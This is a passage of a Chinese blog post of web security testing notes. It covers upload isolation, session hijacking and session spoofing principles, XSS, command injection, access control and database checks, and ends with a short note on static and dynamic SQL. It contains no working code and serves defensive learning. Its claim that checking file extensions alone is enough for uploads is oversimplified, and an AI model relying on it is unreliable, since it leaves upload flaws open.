抓住几个地方即可，先来分析下，既然用户要上存文件，而且文件将是多种多样格式；可能有的文件内容与用户传入格式不一致，有的文件内容还夹杂木马代码。 那么，我们让用户上存文件，跟站点文件做一个分别授权，做隔离。<br>
	让保存上存目录独立开来，目录权限只读不能执行<br>
这一步从系统设计加以授权，无论你上次什么文件，都不可能执行到。就算我不做任何检测，你的文件都上存到这里了，也不会对我系统构成安全。（如果有用户上存一些反动言语的图片，那另外需要处理的）<br>
	不直接使用服务器传入值，所有都要进行检测<br>
这类跟我们做一切输入都是有害原则一样，对于客户端传入的：type, name ，都要进行判断，不直接使用。对于要生成到某个目录，某个文件名。<br>
文件名最好方法是：自己写死目录（不要读取传入目录），文件名，最好自己随机生成，不读取用户文件名。文件扩展名，可以取最右边”.”后面字符。<br>
以上2个方法，刚好从2个方面对上存做了整体约束。<br>
方法1：只要保证文件写对了位置，然后从配置上，对写入目录进行权限控制，这个是治本。可以做到，你无论上存什么文件，都让你没有权限跳出去可以运行。<br>
方法2 ： 保存上存文件名，按照自己指定目录写入，并且文件名自己生成的。<br>
以上2个方法，一起使用，可以保证文件正确存到地方，然后，权限可以控制。 这里顺便说明下， 判断用户上存文件是否满足要求类型，就直接检查文件扩展名，只要满足扩展名就让上存。 反正，做了执行权限限制，你不按要求上存内容，也无妨。 反正，不能执行，也不会有多大危害性的。<br>
正确步骤：<br>
1.读取文件名，验证扩展名是不是在范围内<br>
2.自己定义生成的文件名，目录，扩展名可以来自文件名扩展名。 其它值，都自己配置，不读取上存中内容<br>
3.将文件 移到新目录(这个目录权限设置只读)</p>
<p>2.5.3 文件操作漏洞检测方法<br>
	测试系统是否允许上传脚本文件、可执行文件等有可能给系统带来危害的文件。<br>
	若有下载功能，可供下载的文件是否与系统的程序分别存放，是否存在数据库文件、包含文件和页面文件下载的可能。<br>
文件操作漏洞测试一般使用手工测试的方法，若发现问题，应及时修改代码并将可供下载的文件重新布署。</p>
<p>2.6 Session 测试<br>
2.6.1 客户端对服务器端的欺骗攻击</p>
<p>2.6.1.1 攻击原理<br>
在用户访问并登录了某个网站后，该网站的服务器就会给该用户机子上分配一个sessionid，此信息是通过客户机的cookies存放在某一文件夹里面的。session本身并不是长期有效，每一个session在客户端关闭浏览器后sessionid都会自动撤销，但服务端默认保存20分钟。正是有这20分钟的时间，给欺骗带来了可能。 服务器端对不同用户的识别，只能通过sessionid进行，也就是说网站服务器端是“只认id不认人”，只要id符合，就认为是合法用户，所以攻击者只要得到了被攻击对象的sessionid就可以以被攻击对象的身份合法登录，而20分钟的默认保留值，也使得攻击者即使在被攻击对象关闭浏览器后依然有一定的时间成功登录。<br>
当前利用此原理进行攻击的常用手法是利用网站本身的xss漏洞或者是诱骗被攻击者点击相应链接，以使其隐蔽访问攻击者事先假设好的网站并执行恶意代码，获取被攻击者的cookies信息从而得到sessionid。最后用可以修改sessionid的浏览器或其它可以提交数据的工具伪装成被攻击者的id合法登录。</p>
<p>2.6.1.2 防范措施<br>
此类攻击过程较为隐蔽，但也有其局限性。因为session本身有时间限制，特别是用户在关闭浏览器后，留给攻击者的时间也只有20分钟。另外，在触发机制上，盗窃cookies代码的执行必须是用户自己触发，也就是说，用户什么时候触发代码，攻击者是不知道的，从用户触发恶意代码到session失效，攻击者只有很短的时间进行非法活动。<br>
所以，要对此类攻击进行防范，客户端本身应对陌生人给出的超级链接保持警惕，特别是对比较长的超链接更要小心。每次登录网站后应该及时利用网站的退出功能退出和清除本机的cookies。另外登录密码的设置不要过于简单，尽量使用字母与数字组合，密码长度应该在8位以上。网站管理员在开发网站时要注意检查网站的xss漏洞，要注意session有效期的设置，一般不要把有效期设置太长，这样即使真的被攻击也能让其非法活动时间大大缩短。</p>
<p>2.6.2直接对服务器端的欺骗攻击</p>
<p>2.6.2.1 攻击原理<br>
与客户端欺骗不同，此类攻击是对服务器端的直接欺骗。网站开发者在管理员管理页面通常都会有session验证，目的是为了验证当前登录者是否为合法用户。<br>
但如果攻击者能够在登录管理页面前，使用某种手段使得session（”admin”）被赋值（不一定是网站开发者所赋予的值）则验证代码则无法拦截此类非法登录。从而达到了直接欺骗服务器而以管理员身份直接登录的目的。<br>
当前利用此原理进行攻击的常用手法是都是在取得了某网站域名下的某个webshell进行的。如许多免费空间网站都会在主域名下允许用户有自己的二级域名，而此域名的目录又和网站主目录在同一站点下，这样就为欺骗攻击提供了条件。而其它一些网站由于自身的xss等漏洞，使得用户拿下某个webshell，从而也使欺骗攻击成为了可能。在具备了欺骗必备条件后，攻击者还必须知道session验证的源码，从而才能编写恶意代码绕过系统原有的验证。当然，如果验证源码是上文所列的情况，则攻击者只需知道session所用变量即可，因为其并没有给出具体的赋值，只是简单的验证是否为空。攻击者只要赋任意值即可通过此验证。</p>
<p>2.6.2.2 防范措施<br>
此类攻击手法也相当隐蔽，危害极大。因为攻击一旦成功，则攻击者即可以管理员身份非法登录。从此类欺骗攻击的原理我们知道，此攻击要成功必须具备多个先决条件：获得该域名下的一个webshell或者攻击网站与被欺骗网站在同一主站的同一目录下；被攻击主站采取了session验证管理页面；获得被攻击站点的session验证源码；知道被攻击主站的管理页面地址。<br>
所以我们要防范此类攻击，就只能从几个限制条件考虑。网站开发者应该尽量避免各种漏洞，站点在使用前应该经过周密而详尽的测试，从而降低被发现漏洞的可能。对于网站源码不能轻易泄露，特别是在公开场合。如果是使用公开源码假设的网站，更要把源码关键部位更改。本攻击欺骗的关键源码部位即session验证源码。</p>
<p>2.6.3 Session漏洞检测方法<br>
（1）Session互窜<br>
Session互窜即是用户A的操作被用户B执行了。<br>
验证Session互窜，其原理还是基于权限控制，如某笔订单只能是A进行操作，或者只能是A才能看到的页面，但是B的session窜进来却能够获得A的订单详情等。   Session互窜方法：   多TAB浏览器，在两个TAB页中都保留的是用户A的session记录，然后在其中一个TAB页执行退出操作，登陆用户B， 此时两个TAB页都是B的session，然后在另一个A的页面执行操作，查看是否能成功。 预期结果：有权限控制的操作，B不能执行A页面的操作，应该报错，没有权限控制的操作，B执行了A页面 操作后，数据记录是B的而不是A的。<br>
（2）Session超时<br>
基于Session原理，需要验证系统session是否有超时机制，还需要验证session超时后功能是否还能继续走下去。   测试方法：<br>
1、打开一个页面，等着10分钟session超时时间到了，然后对页面进行操作，查看效果。<br>
2、多TAB浏览器，在两个TAB页中都保留的是用户A的session记录，然后在其中一个TAB页执行退出操作，马上在另外一个页面进行要验证的操作，查看是能继续到下一步还是到登录页面。<br>
Session 测试主要检查Web 应用系统是否有超时的限制，也就是检查用户登录后在一定时间内没有点击任何页面，是否需要重新登录才能正常使用，检查超时后能否自动退出，退出之后，浏览器回退按钮是否可以回到登录页面。Session 测试一般使用手工测试和工具测试相结合的方法，若发现问题，应及时修改代码。</p>
<p>2.7 跨网站脚本(XSS)漏洞测试<br>
2.7.1 跨网站脚本（XSS）漏洞实现原理<br>
跨站脚本漏洞（Cross Site Scripting，常简写作XSS）是Web应用程序在将数据输出到网页的时候存在问题，导致攻击者可以将构造的恶意数据显示在页面的漏洞。因为跨站脚本攻击都是向网页内容中写入一段恶意的脚本或者HTML代码，故跨站脚本漏洞也被叫做HTML注入漏洞（HTML Injection）。 与SQL注入攻击数据库服务器的方式不同，跨站脚本漏洞是在客户端发动造成攻击，也就是说，利用跨站脚本漏洞注入的恶意代码是在用户电脑上的浏览器中运行的。</p>
<p>2.7.2 跨网站脚本（XSS）漏洞防范措施<br>
下列规则旨在防止所有发生在应用程序的XSS攻击，虽然这些规则不允许任意向HTML文档放入不可信数据，不过基本上也涵盖了绝大多数常见的情况。你不需要采用所有规则，很多企业可能会发现第一条和第二条就已经足以满足需求了。请根据自己的需求选择规则。<br>
（1）	不要在允许位置插入不可信数据<br>
第一条规则就是拒绝所有数据，不要将不可信数据放入HTML文档，除非是下列定义的插槽。这样做的理由是在理列有解码规则的HTML中有很多奇怪的context，让事情变得很复杂，因此没有理由将不可信数据放在这些context中。<br>
（2）	在向HTML元素内容插入不可信数据前对HTML解码<br>
这条规则适用于当你想把不可信数据直接插入HTML正文某处时，这包括内部正常标签(div、p、b、td等)。大多数网站框架都有HTML解码的方法且能够躲开下列字符。但是，这对于其他HTML context是远远不够的，你需要部署其他规则。<br>
（3）	 在向HTML常见属性插入不可信数据前进行属性解码<br>
这条规则是将不可信数据转化为典型属性值(如宽度、名称、值等)，这不能用于复杂属性(如href、src、style或者其他事件处理程序)。这是及其重要的规则，事件处理器属性(为HTML JavaScript Data Values)必须遵守该规则。</p>
<p>2.7.3 跨网站脚本（XSS）漏洞测试方法<br>
对于呈增长趋势的跨站脚本（XSS）攻击，可使用内嵌检测的方式进行处理。使用WebInspect 工具识别所有的假造参数，使用DevInspect 工具通过特定代码关联在页面上发现安全缺陷，对于显示代码，采用CSE HTML Validator工具进行测试。若在检测中发现系统存在跨站脚本(X SS)漏洞，使用输出数据编码也就是将任何数据返回给用户前均采用HTML 编码，可以有效防止跨站点脚本攻击。因为通过HTML 编码，可将大多数脚本命令自动转换为无害文本。</p>
<p>2.8 命令注射漏洞测试<br>
命令注射漏洞测试主要检查所有调用外部资源(例如system、exec、fork，或者所有的发出请求的语法的源代码，查找那些来自于HTTP 请求的输入可能发起调用的所有地方。使用相同功能的专门的库函数来代替shell 命令和一些系统调用，可以抵御命令注射的攻击，另外一种避免命令注射的保护措施就是确保Web 应用程序只是根据它所要执行某个功能时所需的最小权限来实现这个功能。如果必须使用外部命令的话，任何被插入命令的用户信息必须仔细地审查，设立一定的机制来处理可能出现的错误、超时、或者在调用过程中出现的阻塞。</p>
<p>2.9 日志文件测试<br>
日志文件测试主要检查Web 运行的相关信息是否写进了日志文件、是否可追踪，是否记录了系统运行中发生的所有错误，是否记录了用户的详细信息，包括用户的浏览器、用户停留的时间、用户IP 等。记录了用户的IP，就能通过追捕查出用户的具体地点。错误作为日志保留下来，可供技术人员分析错误是由系统实现漏洞引起的还是由于黑客攻击引起的。</p>
<p>2.10 访问控制策略测试<br>
访问控制策略是网络安全防范和保护的主要策略，其任务是保证网络资源不被非法使用和非法访问。各种网络安全策略必须相互配合才能真正起到保护作用，而访问控制是保证网络安全最重要的核心策略之一。访问控制策略包括入网访问控制策略、操作权限控制策略、目录安全控制策略、属性安全控制策略、网络服务器安全控制策略、网络监测、锁定控制策略和防火墙控制策略等7个方面的内容。</p>
<p>2.10.1 访问控制策略测试方法<br>
	主要检查管理接口是否只有授权的管理员才允许进行访问（对于支持多种管理角色的网站接口往往是内部或者外部攻击者的攻击目标）<br>
	是否有完善的访问控制策略文档（如果该文档不存在的话，这个网站很可能存在着漏洞），文档中是否精确定义了每类用户可以访问的功能和内容<br>
	检查是否只有授权的数据可被访问（如果存在着不同类型或不同组别的数据可以通过接口被访问到）。<br>
主要用于需要验证用户身份以及权限的页面，复制该页面的url地址，关闭该页面以后，查看是否可以直接进入该复制好的地址；<br>
例：从一个页面链到另一个页面的间隙可以看到URL地址，直接输入该地址，可以看到自己没有权限的页面信息；</p>
<p>3 数据库问题测试<br>
在Web 应用中，数据库起着重要的作用，数据库为Web应用系统的管理、运行、查询和实现用户对数据存储的请求等提供空间。因此，Web 应用系统中数据库安全测试是一个重要的方面。与数据库相关的应用级漏洞如SQL 注入和跨站点脚本攻击等问题前面已提及，在此只讨论数据库本身及数据库使用方面的漏洞。</p>
<p>3.1 数据库名称和存放位置安全检测<br>
一个常规的数据库名称，并且存放在与Web 应用程序文件相同或相关的位置，很容易被下载。若在程序代码中包含有数据库名称和数据库文件绝对位置，一旦代码丢失，同样存在暴库的危险。因此，在布署数据库和编写相关的代码时，要避免问题的发生。</p>
<p>3.2 数据库本身的安全检测<br>
对数据库本身的安全检测主要检查数据库是否配置了不同的存取权限，所有操作是否都可以审计追踪，敏感数据是否加密等。为了保证数据库的安全，不同权限的用户定义不同的视图，以限制用户的访问范围；不同的敏感数据采取不同的加密算法，重要的数据分开存储。</p>
<p>3.3 数据使用时的一致性和完整性测试<br>
Web 应用系统中，使用数据库时，可能发生数据的一致性和完整性错误，因此，要检测系统中是否有事务管理和故障恢复功能，确认事务数据是否正确保存，检测系统是否有定期数据备份功能。</p>
<p>4 容错测试<br>
正常操作时，Web 应用程序也总会有错误出现，如内存溢出、空指针异常、系统调用失败、数据库不可用、网络超时等。不当的出错处理可能给网站带来各种各样的安全问题，因此，要对Web 应用程序的错误处理进行测试，以保证为用户提供一份有意义的出错信息，为网站维护人员提供诊断信息，而不是为攻击者提供有用的信息。</p>
<p>4.1 容错方案及方案一致性测试<br>
出错处理应该在整个网站中保持一致性，并且每一个出32错处理片断都应该是一个整体设计方案中的一部分。通过代码检查，测试系统差错处理方案是否合理，方案是否可以处理所有可能发生的错误，方案中是否存在泄漏设计细节的问题，是否存在不同的差错处理方案。</p>
<p>4.2 接口容错测试<br>
检测浏览器与服务器的接口是否正确，中断用户到服务器的网络连接时，系统是否能够正确处理数据；对于有外部接口的Web 系统，如网上商店可能要实时验证信用卡数据以减少欺诈行为的发生，中断Web 服务器到信用卡验证服务器的连接，检测系统是否能够正确处理这些错误，是否对信用卡进行收费。另外，还要测试系统是否能够处理外部服务器返回的所有可能的消息。</p>
<p>4.3 压力测试<br>
压力测试是实际破坏一个Web 应用系统，也就是测试Web应用系统会不会崩溃，在什么情况下会崩溃。黑客常常提供错误的数据负载，直到Web 应用系统崩溃，接着当系统重新<br>
启动时获得存取权。压力测试的区域包括表单、登录和其他信息传输页面，可以采用ab（Apache 的测试工具）和OpenSTA（开发系统测试架构）等相应的工具进行自动化测试。</p>
<h1 id="2021-08-10">2021-08-10</h1>
<p>静态和动态sql语句<br>
所谓的sql的动态的和静态的语句，是指sql语句在何时被编译和执行，二者都是用在sql嵌入式编程中的<br>
静态sql ：静态SQL语句一般用于嵌入式sql应用中，在程序运行前，sql 语句必须是确定的例如sql语句中涉及的列名和表名必须是存在的，静态sql语句的编译是在应用程序执行前进行的，编译的结果会存储在数据库内部，而后程序运行的时候，数据库将直接执行比那一号的SQL语句，从而降低与形式的开销</p>
<p>静态SQL在编译的时候就已经生成好了执行计划，所以执行效率会更高</p>
<p>动态sql ：动态SQL语句是在应用程序执行时被编译和执行的，例如使用DB2的交互式工具CLP访问数据库时，用户输入的SQL语句时不确定的，因此SQL语句只能被动态的编译，动态SQL的应用比较多，常见的CLI和JDBC应用程序都使用动态SQL</p>

            </div>
          </article>
        </div>
        <div class="paper" data-aos="fade-in">
          
            <div class="next-post">
              <div class="next">
                下一篇
              </div>
              <a href="https://jinqipiaopiao.github.io/post/sql-zhu-ru-guo-lu-zi-fu-de-fuzz-jiao-ben-ce-shi/">
                <h3 class="post-title">
                  SQL注入过滤字符的Fuzz脚本测试
                </h3>
              </a>
            </div>
          
        </div>
        
      </div>

      <div class="sm-12 md-4 col sidebar">
  <div class="paper info-container">
    <img src="https://jinqipiaopiao.github.io//images/avatar.png?v=1633574676036" class="no-responsive avatar">
    <div class="text-muted">温故而知新</div>
    <div class="social-container">
      
        
      
        
      
        
      
        
      
        
      
    </div>
  </div>
  <div class="paper">
    <div class="sidebar-title">
      最新文章
    </div>
    <div class="row">
      <ul>
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/2021-9-4-kai-xue-bi-ji/">2021-9-4开学笔记</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/shu-jia-xue-xi-bi-ji-ji-lu/">暑假学习笔记记录</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/sql-zhu-ru-guo-lu-zi-fu-de-fuzz-jiao-ben-ce-shi/">SQL注入过滤字符的Fuzz脚本测试</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/md5-xiang-guan-bi-jiao/">md5相关比较</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/buuctf/">BUUCTF</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/li-yong-yu-bian-yi-lai-sql-zhu-ru/">利用预编译来SQL注入</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/python-mo-ban-zhu-ru/">Python-模板注入</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/web-an-quan-xiang-guan-zhi-shi-dian/">web安全相关知识点</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/userini-wen-jian-gou-cheng-de-php-hou-men/">.user.ini文件构成的PHP后门</a>
            </li>
          
        
          
            <li>
              <a href="https://jinqipiaopiao.github.io/post/ying-yong-ceng-xie-yi/">应用层协议</a>
            </li>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      </ul>
    </div>
  </div>
  <div class="paper">
    <div class="sidebar-title">
      标签列表
    </div>
    <div class="row">
      
        <a href="https://jinqipiaopiao.github.io/tag/I-a6dyp2Q/" class="badge success">
          Gridea
        </a>
      
    </div>
  </div>
  <div class="paper">
    Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://jinqipiaopiao.github.io//atom.xml" target="_blank">RSS</a>
  </div>
</div>


    </div>

    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>

<script type="application/javascript">

AOS.init();

hljs.initHighlightingOnLoad()

</script>




  </body>
</html>
